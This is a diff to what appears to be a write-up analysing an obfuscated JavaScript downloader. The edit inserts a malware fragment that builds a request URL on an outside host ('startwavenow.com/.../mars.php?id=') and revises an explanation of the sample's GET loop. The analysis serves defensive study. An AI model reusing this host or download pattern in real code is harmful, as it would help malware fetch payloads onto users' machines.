@@ -406,6 +406,10 @@ req.setTimeouts(QSJCTxMMl, bFPwcaPNy, zarI, olWVonsDzH);
 Following code uses GET method to receive some data from remote machine:
 
 ```javascript
+(...)
+var MOSKn = [];
+MOSKn[0] = "http://startwavenow.com/cmh" + "/mars.php?id=" + VuSD;
+(...)
 var pointer_MOSKn = -1;
 var aka;
 do {
@@ -427,7 +431,7 @@ do {
 return aka;
 ```
 
-Do loop above executes as long as **aka** will not equal to 0. 
+If we take a look at this fragment a little bit closer, it does not have a lot of sense. Take a look at how **MOSKn** array is used - only its first element is initalised and then, inside do...while() loop, only 0 index is in use (if we follow  **pointer_MOSKn**, its value is always 0).
 
 
 
